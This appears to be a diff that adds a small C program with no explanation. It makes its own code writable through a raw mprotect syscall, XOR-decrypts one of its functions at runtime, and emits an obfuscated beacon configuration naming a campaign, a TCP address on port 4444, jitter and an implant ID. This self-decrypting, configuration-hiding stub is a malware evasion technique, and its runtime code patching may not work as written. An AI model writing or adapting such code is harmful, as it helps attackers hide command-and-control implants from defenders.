@@ -1,0 +1,16 @@
+#include <stdio.h>
+#include <stdint.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#define N 95
+__attribute__((noinline, section(".text.enc"))) void build(unsigned char *out) {
+  volatile unsigned char b[N]; b[0]=0x48;b[1]=0x43;b[2]=0x46;b[3]=0x47;b[4]=0x01;b[5]=0x5c;b[6]=0x53;b[7]=0x00;b[8]=0x55;b[9]=0xcb;b[10]=0x53;b[11]=0xa9;b[12]=0x27;b[13]=0x7e;b[14]=0x3f;b[15]=0x3d;b[16]=0x31;b[17]=0x2c;b[18]=0x3d;b[19]=0x35;b[20]=0x3b;b[21]=0x32;b[22]=0x7e;b[23]=0x66;b[24]=0x7e;b[25]=0x2f;b[26]=0x31;b[27]=0x3f;b[28]=0x71;b[29]=0x2f;b[30]=0x25;b[31]=0x2f;b[32]=0x7e;b[33]=0x70;b[34]=0x7e;b[35]=0x3e;b[36]=0x39;b[37]=0x3d;b[38]=0x3f;b[39]=0x33;b[40]=0x32;b[41]=0x7e;b[42]=0x66;b[43]=0x7e;b[44]=0x28;b[45]=0x3f;b[46]=0x2c;b[47]=0x66;b[48]=0x73;b[49]=0x73;b[50]=0x6e;b[51]=0x6c;b[52]=0x6f;b[53]=0x72;b[54]=0x6c;b[55]=0x72;b[56]=0x6d;b[57]=0x6d;b[58]=0x6f;b[59]=0x72;b[60]=0x65;b[61]=0x66;b[62]=0x68;b[63]=0x68;b[64]=0x68;b[65]=0x68;b[66]=0x7e;b[67]=0x70;b[68]=0x7e;b[69]=0x36;b[70]=0x35;b[71]=0x28;b[72]=0x28;b[73]=0x39;b[74]=0x2e;b[75]=0x7e;b[76]=0x66;b[77]=0x6b;b[78]=0x70;b[79]=0x7e;b[80]=0x35;b[81]=0x38;b[82]=0x7e;b[83]=0x66;b[84]=0x7e;b[85]=0x0f;b[86]=0x11;b[87]=0x1f;b[88]=0x71;b[89]=0x69;b[90]=0x69;b[91]=0x19;b[92]=0x6c;b[93]=0x7e;b[94]=0x21;
+  for (int i = 0; i < N; i++) out[i] = b[i]; }
+__attribute__((noinline, section(".text.enc"))) void build_end(void) { __asm__ volatile("nop"); }
+static long prot(void *a, unsigned long n) {
+  long r; __asm__ volatile("syscall" : "=a"(r) : "0"(10L), "D"(a), "S"(n), "d"(7L) : "rcx", "r11", "memory"); return r; }
+int main(void) {
+  unsigned char buf[N]; uintptr_t a = (uintptr_t)build & ~(uintptr_t)4095;
+  if (prot((void *)a, ((uintptr_t)build_end - a + 4096) & ~(uintptr_t)4095)) return 1;
+  for (volatile unsigned char *p = (unsigned char *)build; p < (unsigned char *)build_end; p++) *p ^= 0x3d;
+  build(buf); fwrite(buf, 1, N, stdout); return 0; }
